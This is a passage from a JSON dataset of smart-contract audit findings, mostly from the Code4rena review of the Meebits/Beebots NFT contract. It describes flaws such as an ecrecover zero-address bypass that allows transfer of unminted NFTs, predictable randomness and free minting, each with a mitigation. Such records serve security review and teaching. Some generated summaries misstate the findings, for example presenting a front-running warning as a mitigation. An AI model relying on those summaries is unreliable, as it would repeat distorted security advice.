      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/26",
      "tags": [],
      "finders": []
    },
    {
      "id": "3982",
      "title": "[L-05] SafeMath library asserts instead of reverts",
      "impact": "LOW",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe implementation of SafeMath `assert`s instead of performing a `revert` on failure.\n\n## Impact\n\nAn `assert` will consume all gas of the transaction whereas a `revert`/`require` releases the remaining gas to the transaction sender again.\nUsually, one wants to try to keep the gas cost for contract failures low and use `assert` only for invariants that should always be true.\n\n## Recommended Mitigation Steps\n\nUse `require` instead of `assert`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/17",
      "tags": [],
      "finders": []
    },
    {
      "id": "3981",
      "title": "[L-04] Missing event in critical devMint() function",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe dev/deployer is allowed to mint an unlimited quantity of NFTs without paying to arbitrary recipients. This reduces the token balance and affects token availability for other sale participants, and therefore is significant enough to warrant its own event.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L341-L346\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd an event for devMint and emit at the end of devMint() function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/42",
      "tags": [],
      "finders": []
    },
    {
      "id": "3980",
      "title": "[L-03] Missing error messages in require statements of various function",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nUse of informative error messages helps troubleshoot exceptional conditions during transaction failures or unexpected behavior. Otherwise, it can be misleading and waste crucial time during exploits or emergency conditions. \n\nWhile many require statements have descriptive error messages, some are missing them.\n\nFor reference, see Note 2 in OpenZeppelin's Audit of Compound Governor Bravo: https://blog.openzeppelin.com/compound-governor-bravo-audit/\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L270\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L281\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L356\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L445\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L462\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L467\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L557\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L650\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nUse meaningful error messages which specifically describe the conditional failure in all require statements.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/40",
      "tags": [],
      "finders": []
    },
    {
      "id": "3979",
      "title": "[L-02] Incorrect Implementation",
      "impact": "LOW",
      "content": "## Handle\n\n0xsomeone\n\n\n## Vulnerability details\n\n## Impact\n\nThe `tokenByIndex` function appears to not perform correctly as it simply checks its input argument and returns it.\n\n## Proof of Concept\n\nN/A.\n\n## Tools Used\n\nManual Review.\n\n## Recommended Mitigation Steps\n\nI advise this function to be properly fleshed out or omitted from the codebase to avoid redundant bytecode.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/16",
      "tags": [],
      "finders": []
    },
    {
      "id": "3978",
      "title": "[L-01] Missing parameters in SalesBegin event of critical startSale() function",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nConsider including salesStartTime and salesDuration as parameters in the SaleBegins event to allow off-chain tools to track sale launch time and duration, especially given that sale price depends on the time elapsed in the sale.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L102-L105\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L215-L222\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L333-L338\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd salesStartTime and salesDuration as parameters in the SaleBegins event of startSale() function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/37",
      "tags": [],
      "finders": []
    },
    {
      "id": "3977",
      "title": "[L-01] Mint can be front-run",
      "impact": "LOW",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe price of an MFT falls over time which creates a dynamic that one potential buyers want to wait for the price to drop but also not wait too long to avoid hitting the max sale cap.\nHowever, on public blockchains any such `mint` call can be observed and attackers can simply wait until another person decides to buy at the current price and then frontrun that person.\n\n\n## Impact\n\nLegitimate minters can be frontrun and end up with a failed transaction and without the NFT as the max sale limit is reached: `require(numSales < SALE_LIMIT, \"Sale limit reached.\");`\n\n## Recommended Mitigation Steps\n\nFront-running is hard to prevent, maybe an auction-style minting process could work where the top `SALE_LIMIT` bids are accepted after the sale duration.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/20",
      "tags": [],
      "finders": []
    },
    {
      "id": "3976",
      "title": "[L-00] Atypical contract structure affects maintainability and readability",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nA typical/recommended contract structure has the variable declarations followed by events instead of the other way around. This affects readability/maintainability and may introduce/persist security issues.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L77-L164\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nConsider restructuring the contract to place the variable declarations before events.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/23",
      "tags": [],
      "finders": []
    },
    {
      "id": "3975",
      "title": "[M-02] instead of `call()` , `transfer()` is used to withdraw the ether",
      "impact": "MEDIUM",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\n\nfunction withdraw(uint amount) external {\n        require(amount <= ethBalance[msg.sender]);\n        ethBalance[msg.sender] = ethBalance[msg.sender].sub(amount);\n        msg.sender.transfer(amount);\n        emit Withdraw(msg.sender, amount);\n    }\n\nTo withdraw eth it uses transfer(), this trnansaction will fail inevitably when : - \n\n1. The withdrwer smart contract does not implement a payable function.\n\n2. Withdrawer smart contract does implement a payable fallback which uses more than 2300 gas unit\n\n3. Thw withdrawer smart contract implements a payable fallback function whicn needs less than 2300 gas unit but is called through proxy that raise the call's gas usage above 2300\n\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\n\n\n\n\n## Proof of Concept\n\n   https://github.com/code-423n4/2021-04-redacted/blob/main/Beebots.sol#L649\n\n## Tools Used\n\nno tool used\n\n## Recommended Mitigation Steps\n\nuse call() to send eth",
      "summary": "\nThis bug report is about a vulnerability in the withdraw function of a smart contract. The vulnerability is that when a user attempts to withdraw ETH, it uses the transfer() function, which can fail if the withdrawer smart contract does not implement a payable function, if it implements a payable fallback which uses more than 2300 gas units, or if the payable fallback function is called through a proxy that raises the call's gas usage above 2300. A proof of concept can be found in the link provided. No tools were used to find the vulnerability. The recommended mitigation step is to use call() to send ETH instead of transfer().",
      "quality_score": 2,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/2",
      "tags": [
        "call vs transfer"
      ],
      "finders": []
    },
    {
      "id": "3974",
      "title": "[M-01] `randomIndex` is not truly random - possibility of predictably minting a specific token Id",
      "impact": "MEDIUM",
      "content": "## Handle\n\n@GalloDaSballo\n\n\n## Vulnerability details\n\n## Impact\nDetailed description of the impact of this finding.\n\nrandomIndex: https://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L307\nIs not random\n\nAny miner has access to these values\nuint index = uint(keccak256(abi.encodePacked(nonce, msg.sender, block.difficulty, block.timestamp))) % totalSize;\n\nNon miner attackers could also test the minting random condition until they get the id they are looking to access\n\nhttps://medium.com/dedaub/bad-randomness-is-even-dicier-than-you-think-7fa2c6e0c2cd\n\nThe internal variable `indices` https://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L158\nSeems to be used to avoid this type of collision\n\nWhile this makes it less straightforward there is still the possibility of minting a token with a specific id.\n\nThat said, _addNFToken\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L408\nis checking if the token is already owned by an address, ensuring a token can't be stolen.\n\nRefactoring as suggested below will save gas, make code easier to read, and prevent reverts in rare unfortunate occasions of clashes\n\n## Proof of Concept\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.\n\nSee this article \nhttps://medium.com/dedaub/bad-randomness-is-even-dicier-than-you-think-7fa2c6e0c2cd\n\n## Recommended Mitigation Steps\n\nRefactor to not generate random Ids, instead use counters, it will make the code more predictable and easier to read, avoids clashing of ids, reduces the need to track minted tokens.\n\nSee and example by Austin Griffith: https://github.com/austintgriffith/scaffold-eth/blob/buyer-mints-nft/packages/hardhat/contracts/YourCollectible.sol\n\nIf you use counters, you can get rid of the entire random generation, including the variables used for it:\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L156\n\nThis will also make calculating totalSize by just looking at counters:\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L308",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract on the Ethereum blockchain. The code uses a random index to generate a unique token ID, however, this index is not random and a miner or non-miner attacker can access or test the minting random condition until they get the ID they are looking to access.\n\nThe bug report recommends refactoring the code to not generate random IDs, instead using counters. This will make the code more predictable and easier to read, avoid clashes of IDs, and reduce the need to track minted tokens. An example of this was provided by Austin Griffith, and it was also suggested to get rid of the entire random generation, including the variables used for it. This will also make calculating the totalSize easier.\n\nOverall, this bug report is about a vulnerability in the code of a smart contract on the Ethereum blockchain and provides a recommendation for mitigating the issue with refactoring the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/30",
      "tags": [],
      "finders": []
    },
    {
      "id": "3973",
      "title": "[M-00] Legacy Function Usage",
      "impact": "MEDIUM",
      "content": "\nThe `withdraw` function utilizes the `transfer` invocation, which has a fixed gas stipend and can fail, especially beyond the Berlin fork, which increased the [gas costs](https://eips.ethereum.org/EIPS/eip-2929) for first-time invocations of a transfer.\n\nThe EIP should be sufficient.\n\nRecommend using a safe wrapper library, such as the OpenZeppelin `Address` library's `sendValue` function, which forwards sufficient gas for the transfer regardless of the underlying OPCODE gas costs.\n\n",
      "summary": "\nThis bug report is about the `withdraw` function in Ethereum, which is utilizing the `transfer` invocation. This can fail, especially after the Berlin fork, which increased the gas costs for first-time invocations of a transfer. The bug was found through manual review, and the recommended mitigation step is to use a safe wrapper library, such as the OpenZeppelin `Address` library's `sendValue` function. This will forward sufficient gas for the transfer regardless of the underlying OPCODE gas costs, and should prevent the bug from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/14",
      "tags": [],
      "finders": []
    },
    {
      "id": "3972",
      "title": "[H-05] NFT can be minted for free after sale ended",
      "impact": "HIGH",
      "content": "\nThe `getPrice()` function returned 0 after the sale ended and (```SALE_LIMIT - numSales```) NFT can be minted for free.\n\nWithout documentation, it's not clear if this is the expected behavior or not. If it's unexpected, it is recommended to revert instead of returning 0. If it's expected behavior, it's possible to create a smart contract and claim all the remaining NFT front-running the regular users.\n\n",
      "summary": "\nThis bug report details a vulnerability in the getPrice() function (https://github.com/code-423n4/2021-04-redacted/blob/main/Beebots.sol#L334) which returns 0 after the sale ends, allowing a user to mint a certain amount of non-fungible tokens (NFTs) for free. The bug was discovered through manual analysis. The recommended mitigation steps are to either revert the function instead of returning 0, or if it is expected behaviour, create a smart contract to claim all remaining NFTs before other users can.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/75",
      "tags": [],
      "finders": []
    },
    {
      "id": "3971",
      "title": "[H-04] function `tokenByIndex` treats last index as invalid",
      "impact": "HIGH",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\nNFT indexes start from 0:\n   // Don't allow a zero index, start counting at 1\n   return value.add(1);\nso if there are 30 tokens, indexes would be 1-30. However, function tokenByIndex sets such boundaries:\n   require(index > 0 && index < TOKEN_LIMIT);\nwhich means that the last token (with index 30 in this case) will not be valid.\n\n## Recommended Mitigation Steps\nrequire(index > 0 && index <= TOKEN_LIMIT);",
      "summary": "\nThis bug report is about a vulnerability in the NFT Indexes. The issue is that when there are 30 tokens, the indexes would be 1-30. However, the function tokenByIndex sets boundaries which means the last token (with index 30 in this case) will not be valid. The recommended mitigation step is to require(index > 0 && index <= TOKEN_LIMIT); in order to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/73",
      "tags": [],
      "finders": []
    },
    {
      "id": "3970",
      "title": "[H-03] `Beebots.TradeValid()` Will Erroneously Return True When Maker Is Set To `Address(0)` and `makerIds` Are Set To The `TokenIds` of Unminted Beebot NFTs",
      "impact": "HIGH",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\n## Impact\n\nBeebots.TradeValid() Will Erroneously Return True When Maker Is Set To Address(0) and makerIds Are Set To The TokenIds of Unminted Beebot NFTs\n\nBeebots.verify() Returns True No Matter What Signature Is Given When Signer Is Set To address(0).\nThis means that BeeBots.tradeValid() will erroneously return true when maker is set to address(0).\nFinally, before an NFT has even been minted at all, it is assumed to have an owner of address(0) due to the idToOwner mapping being initialized to zero for all uninitailized slots, so an attacker can call tradeValid() with maker set to address(0) and makerIds set to the tokenIds of any unminted nftIds, and tradeValid() will erroneously return true.\n\n## Proof of Concept\n(1) Beebots.verify() Returns True No Matter What Signature Is Given When Signer Is Set To address(0)\n(1a) BeeBots.verify() does not check to ensure that signer is not address(0).\n(1b) The reason that this is a problem is that ecrecover fails silently if the signature does not match, and simply returns zero.\n(1c) So if an attacker passes in address(0) as the signer, then verify will return true no matter what signature is provided, since ecrecover will return address(0), and the signer is address(0), so verify will pass.\n(1d) This means that BeeBots.tradeValid() will erroneously return true when maker is set to address(0).\n(2) Before an NFT has even been minted at all, it is assumed to have an owner of address(0) due to the idToOwner mapping being initialized to zero for all uninitailized slots\n(2a) Solidity inializes all mappings to 0 for all slots that have not yet been set.\n(2b) So for any nft id that has not yet been minted, the corresponding owner in the mapping BeeBots.idToOwner is address(0), even though that nft should not even exist.\n(2c) This means that an attacker can call tradeValid() with maker set to address(0) and makerIds set to any unminted nftIds, and tradeValid() will erroneously return true.\n\n## Recommended Mitigation Steps\n(1) Add this check to Beebots.verify():\nrequire(signer != address(0), \"Cannot verify signatures from 0x0\");\n\n(2) Add this check to Beebots.tradeValid():\nrequire(maker != address(0), \"Maker 0x0 not allowed\");",
      "summary": "\nThis bug report is about the BeeBots.tradeValid() function in the Beebots smart contract. This function will erroneously return true when the maker is set to address(0) and the makerIds are set to the tokenIds of unminted Beebot NFTs. The BeeBots.verify() function also returns true no matter what signature is given when the signer is set to address(0). This is because ecrecover fails silently if the signature does not match and simply returns zero. Additionally, before an NFT has even been minted, it is assumed to have an owner of address(0) due to the idToOwner mapping being initialized to zero for all uninitialized slots.\n\nThe recommended mitigation steps for this bug are to add a check to Beebots.verify() to ensure that the signer is not address(0) and to add a check to Beebots.tradeValid() to ensure that the maker is not address(0). This will ensure that the Beebots.tradeValid() function will not erroneously return true when the maker is set to address(0).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/77",
      "tags": [],
      "finders": []
    },
    {
      "id": "3969",
      "title": "[H-02] Arbitrary Transfer of Unowned NFTs",
      "impact": "HIGH",
      "content": "\nDue to how the market functions are structured, it is possible to arbitrarily transfer any NFT that is not owned by any address.\n\nThe function in question is the `tradeValid` function invoked by `acceptTrade` before the trade is performed. It, in turn, validates the signature of a trade via `verify`, which does not account for the behavior of `ecrecover`.\n\nWhen `ecrecover` is invoked with an invalid signature, the zero-address is returned by it, meaning that `verify` will yield `true` for the zero-address as long as the signature provided is invalid.\n\nThis can be exploited to transfer any NFT whose `idToOwner` is zero, including NFTs that have not been minted yet.\n\nRecommend an additional check be imposed within `verify` that ensures the signer is not the zero-address which will alleviate this check. For more details, consult the [EIP721 implementation by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/cryptography/ECDSA.sol#L53-L71).\n\n",
      "summary": "\nThis bug report is about an issue with the `tradeValid` function in the BeeBots.sol code. The function does not account for the behaviour of `ecrecover`, which, when invoked with an invalid signature, returns the zero-address. This means that the `verify` function will yield `true` for the zero-address, regardless of the signature provided. As a result, it is possible to arbitrarily transfer any NFT that is not owned by any address.\n\nTo mitigate this issue, it is recommended to impose an additional check within `verify` to ensure the `signer` is not the zero-address. This can be done by consulting the EIP721 implementation by OpenZeppelin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/4",
      "tags": [],
      "finders": []
    },
    {
      "id": "3968",
      "title": "[H-01] Signature malleability of EVM's `ecrecover` in `verify()`",
      "impact": "HIGH",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nEVM's ecrecover is susceptible to signature malleability which allows replay attacks, but that is mitigated here by tracking accepted offers and cancelling it (on L645) specifically to prevent replays. However, if any of the application logic changes, it might make signature malleability a risk for replay attacks.\n\nSee reference: https://swcregistry.io/docs/SWC-117\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L575\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L643-L645\n\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nConsider using OpenZeppelin’s ECDSA library: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol",
      "summary": "\nThis bug report is about the vulnerability of Ethereum Virtual Machine's ecrecover to signature malleability, which can lead to replay attacks. The proof of concept can be found in the provided GitHub links. The bug was found through manual analysis. The recommended mitigation step is to use OpenZeppelin’s ECDSA library. Signature malleability is a type of attack that can be used to modify an Ethereum transaction signature in a way that doesn't change the meaning of the transaction, but changes the signature itself. This can be used to replay a transaction multiple times, allowing the attacker to gain access to resources or funds. To prevent this, the application logic should be changed to track accepted offers and cancel them. OpenZeppelin’s ECDSA library can also be used to prevent this attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/54",
      "tags": [
        "Signature Malleability"
      ],
      "finders": []
    },
    {
      "id": "3967",
      "title": "[H-00] ERC-721 Enumerable Spec mismatch for index of `tokenByIndex()` function",
      "impact": "HIGH",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nIndex starts at 0 for token array but the implementation here requires index to be greater than 0. This will prevent querying of token at index 0.\n\nSee reference implementation https://github.com/OpenZeppelin/openzeppelin-contracts/blob/3ba2a1354f8f830d5a0e711537efdbdd8bcb109e/contracts/token/ERC721/extensions/ERC721Enumerable.sol#L21\n\nThis will impact compatibility with NFT platforms that expect full conformity with ERC-721 specification.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-redacted/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L462\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/3ba2a1354f8f830d5a0e711537efdbdd8bcb109e/contracts/token/ERC721/extensions/ERC721Enumerable.sol#L21\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/3ba2a1354f8f830d5a0e711537efdbdd8bcb109e/contracts/token/ERC721/extensions/ERC721Enumerable.sol#L49-L55\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAccept 0 index by changing to “require(index >= 0 && index < TOKEN_LIMIT);”",
      "summary": "\nThis bug report is about a vulnerability in the implementation of the token array indexing. The index starts at 0, but the implementation requires the index to be greater than 0, which prevents querying of the token at index 0. This will impact the compatibility with Non-Fungible Token (NFT) platforms that expect full conformity with the ERC-721 specification. The Proof of Concept (PoC) for this vulnerability is provided in the report. Manual analysis was used to identify the vulnerability. The recommended mitigation step is to accept the 0 index by changing the code to “require(index >= 0 && index < TOKEN_LIMIT);”.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "LarvaLabs Meebits",
      "source_link": "https://code4rena.com/reports/2021-04-meebits",
      "github_link": "https://github.com/code-423n4/2021-04-meebits-findings/issues/47",
      "tags": [],
      "finders": []
    },
    {
      "id": "13473",
      "title": "Reuse of CHAINID from contract deployment ✓ Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is addressed in [ScopeLift/[email protected]`7cfdc81`](https://github.com/ScopeLift/umbra-protocol/pull/158/commits/7cfdc81be65bb81e14ad152a0b344d598a3dd512).\n\n\n#### Description\n\n\nThe internal function `_validateWithdrawSignature()` is used to check whether a sponsored token withdrawal is approved by the owner of the stealth address that received the tokens. Among other data, the [chain ID](https://eips.ethereum.org/EIPS/eip-155) is signed over to prevent replay of signatures on other EVM-compatible chains.\n\n\n**contracts/contracts/Umbra.sol:L307-L329**\n\n\n\n```\nfunction \\_validateWithdrawSignature(\n  address \\_stealthAddr,\n  address \\_acceptor,\n  address \\_tokenAddr,\n  address \\_sponsor,\n  uint256 \\_sponsorFee,\n  IUmbraHookReceiver \\_hook,\n  bytes memory \\_data,\n  uint8 \\_v,\n  bytes32 \\_r,\n  bytes32 \\_s\n) internal view {\n  bytes32 \\_digest =\n    keccak256(\n      abi.encodePacked(\n        \"\\x19Ethereum Signed Message:\\n32\",\n        keccak256(abi.encode(chainId, version, \\_acceptor, \\_tokenAddr, \\_sponsor, \\_sponsorFee, address(\\_hook), \\_data))\n      )\n    );\n\n  address \\_recoveredAddress = ecrecover(\\_digest, \\_v, \\_r, \\_s);\n  require(\\_recoveredAddress != address(0) && \\_recoveredAddress == \\_stealthAddr, \"Umbra: Invalid Signature\");\n}\n\n```\nHowever, this chain ID is set as an immutable value in the contract constructor. In the case of a future contentious hard fork of the Ethereum network, the same `Umbra` contract would exist on both of the resulting chains. One of these two chains would be expected to change the network’s chain ID, but the `Umbra` contracts would not be aware of this change. As a result, signatures to the `Umbra` contract on either chain would be replayable on the other chain.\n\n\nThis is a common pattern in contracts that implement [EIP-712](https://eips.ethereum.org/EIPS/eip-712) signatures. Presumably, the motivation in most cases for committing to the chain ID at deployment time is to avoid recomputing the EIP-712 domain separator for every signature verification. In this case, the chain ID is a direct input to the generation of the signed digest, so this should not be a concern.\n\n\n#### Recommendation\n\n\nReplace the use of the `chainId` immutable value with the `CHAINID` opcode in `_validateWithdrawSignature()`. Note that `CHAINID` is only available using Solidity’s inline assembly, so this would need to be accessed in the same way as it is currently accessed in the contract’s constructor:\n\n\n**contracts/contracts/Umbra.sol:L68-L72**\n\n\n\n```\nuint256 \\_chainId;\n\nassembly {\n  \\_chainId := chainid()\n}\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Umbra Smart Contracts",
      "source_link": "https://consensys.net/diligence/audits/2021/03/umbra-smart-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Nicholas Ward\n"
      ]
    },
    {
      "id": "11197",
      "title": "[L08] Unclear comments and naming",
      "impact": "LOW",
      "content": "Throughout the codebase, there are many spots in which variable names or comments are unclear. The examples we identified are:\n\n\n* The [constant `DENOMINATORS` and the mappings `multipliers`, `poolCaps`, and `accountLimits`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol#L16-L20) within the [`Allowlist` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol) have no comments explaining their intended use.\n* The [variables `swapStorage`, `allowlist`, and `isGuarded` and the mapping `tokenIndexes`](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol#L35-L38) within the [`Swap` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Swap.sol) have no comments explaining their intended use.\n* The acronym `TVL` on [line 84](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol#L84) and [line 86](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol#L86) of the [`Allowlist` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/Allowlist.sol) is not explicitly stated.\n* On lines [193](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L193) and [196](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol#L196) of the `SwapUtils` contract, `dy` is mentioned but isn’t explained.\n* The variables `xp`, `A`, `nA`, `D`, `dP`, `b`, `c`, `y`, `xpi`, `D0`, `D1`, `v`, `A0`, `A1`, `t0`, `t1`, `dx`, and `dy` within the [`SwapUtils` contract](https://github.com/saddle-finance/saddle-contract/blob/0b76f7fb519e34b878aa1d58cffc8d8dc0572c12/contracts/SwapUtils.sol) are used frequently, but are not descriptive 